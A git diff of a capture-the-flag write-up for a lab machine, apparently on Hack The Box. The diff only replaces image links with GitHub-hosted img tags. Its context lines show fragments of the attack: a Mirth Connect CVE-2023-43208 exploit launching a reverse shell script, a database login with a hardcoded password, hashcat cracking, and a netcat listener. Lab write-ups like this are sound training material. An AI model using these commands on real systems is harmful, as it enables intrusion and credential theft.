@@ -13,7 +13,8 @@
 
 ## 1. Recon
 
-![nmap scan result](image.png)
+<img width="593" height="398" alt="image" src="https://github.com/user-attachments/assets/af68e88b-d4bd-4e74-b4dc-27b71276a0b7" />
+
 
 ```bash
 nmap -sC -sV -oA interpreter 10.129.55.240
@@ -50,7 +51,8 @@ python3 cve-2023-43208-exploit.py -u https://10.129.55.240 \
   -c 'bash /tmp/r.sh'
 ```
 
-![Reverse shell landing after payload execution](image-1.png)
+<img width="661" height="129" alt="image-1" src="https://github.com/user-attachments/assets/2bbd8d02-d962-4432-8b9a-d2b6f087ad24" />
+
 
 The exploit returns HTTP 500 — this is expected behavior; the payload executes despite the error response.
 
@@ -66,9 +68,12 @@ With a shell as `mirth`, we found hardcoded database credentials in the Mirth Co
 mirth@interpreter:/usr/local/mirthconnect/conf$ mysql -u mirthdb -p'MirthPass123!' -D mc_bdd_prod
 ```
 
-![mc_bdd_prod tables](image-2.png)
-![PERSON table](image-3.png)
-![PERSON_PASSWORD table](image-4.png)
+<img width="443" height="474" alt="image-2" src="https://github.com/user-attachments/assets/858ca2aa-8756-4fb7-a114-94eba2878f07" />
+
+<img width="1272" height="274" alt="image-3" src="https://github.com/user-attachments/assets/ecaee1bc-ed6e-42c3-82f9-b647d558d6e2" />
+
+<img width="846" height="142" alt="image-4" src="https://github.com/user-attachments/assets/549fa411-cfb5-46ed-9fb6-c9d56f30deb9" />
+
 
 ### Cracking the PBKDF2 Hash
 
@@ -94,7 +99,8 @@ Default iterations for Mirth Connect 4.4.0 are **600,000**. Steps:
 hashcat -m 10900 hash.txt rockyou.txt
 ```
 
-![Cracked password with hashcat](image-5.png)
+<img width="812" height="113" alt="image-5" src="https://github.com/user-attachments/assets/1418d009-155e-44a8-a1ab-974f5019d820" />
+
 
 ### User Flag
 
@@ -105,7 +111,8 @@ ssh sedric@10.129.55.240
 cat ~/user.txt
 ```
 
-![User flag](image-6.png)
+<img width="355" height="37" alt="image-6" src="https://github.com/user-attachments/assets/b0e2077e-f20c-4525-83b3-bfc63820d816" />
+
 
 ---
 
@@ -180,7 +187,8 @@ r = requests.post("http://127.0.0.1:54321/addPatient", data=data)
 print(r.text)
 ```
 
-![Landing root shell](image-7.png)
+<img width="675" height="265" alt="image-7" src="https://github.com/user-attachments/assets/37e4974a-0a0f-41ce-b070-9149769a217e" />
+
 
 ```bash
 nc -lvnp 4444
